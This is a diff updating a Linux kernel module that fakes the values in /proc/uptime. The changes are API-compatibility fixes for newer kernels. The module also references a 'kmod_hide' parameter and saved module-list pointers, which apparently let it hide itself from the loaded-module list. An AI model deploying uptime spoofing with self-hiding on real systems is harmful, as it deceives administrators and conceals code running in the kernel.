@@ -89,7 +89,7 @@ static struct file_operations *uptime_proc_fops;
 static struct list_head *module_previous;
 static struct list_head *module_kobj_previous;
 
-static int param_kmod_hide(const char *, struct kernel_param *);
+static int param_kmod_hide(const char *, const struct kernel_param *);
 
 module_param(uptime, long, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
 MODULE_PARM_DESC(uptime, "Sets uptime to this amount of jiffies");
@@ -153,7 +153,7 @@ void module_show(void)
 #endif
 }
 
-static int param_kmod_hide(const char *val, struct kernel_param *kp)
+static int param_kmod_hide(const char *val, const struct kernel_param *kp)
 {
 	int ret;
 
@@ -261,26 +261,22 @@ static void proc_cleanup(void)
 
 static int uptime_proc_show(struct seq_file *m, void *v)
 {
-	struct timespec idle;
 	struct timespec real_uptime;
-	u64 real_idletime;
+	struct timespec64 real_idle;
 	u64 nsec;
 	u32 rem;
 	int i;
-
-	real_idletime = 0;
-	for_each_possible_cpu(i) real_idletime +=
-	    (__force u64)kcpustat_cpu(i).cpustat[CPUTIME_IDLE];
-
+	nsec = 0;
+	for_each_possible_cpu(i)
+		nsec += (__force u64)kcpustat_cpu(i).cpustat[CPUTIME_IDLE];
 	get_monotonic_boottime(&real_uptime);
-	nsec = cputime64_to_jiffies64(real_idletime) * TICK_NSEC;
-	idle.tv_sec = div_u64_rem(nsec, NSEC_PER_SEC, &rem);
-	idle.tv_nsec = rem;
+	real_idle.tv_sec = div_u64_rem(nsec, NSEC_PER_SEC, &rem);
+	real_idle.tv_nsec = rem;
 	seq_printf(m, "%lu.%02lu %lu.%02lu\n",
-		   (unsigned long)real_uptime.tv_sec + uptime,
-		   (real_uptime.tv_nsec / (NSEC_PER_SEC / 100)),
-		   (unsigned long)idle.tv_sec + idletime,
-		   (idle.tv_nsec / (NSEC_PER_SEC / 100)));
+			(unsigned long) real_uptime.tv_sec + uptime,
+			(real_uptime.tv_nsec / (NSEC_PER_SEC / 100)),
+			(unsigned long) real_idle.tv_sec + idletime,
+			(real_idle.tv_nsec / (NSEC_PER_SEC / 100)));
 	return 0;
 }
 
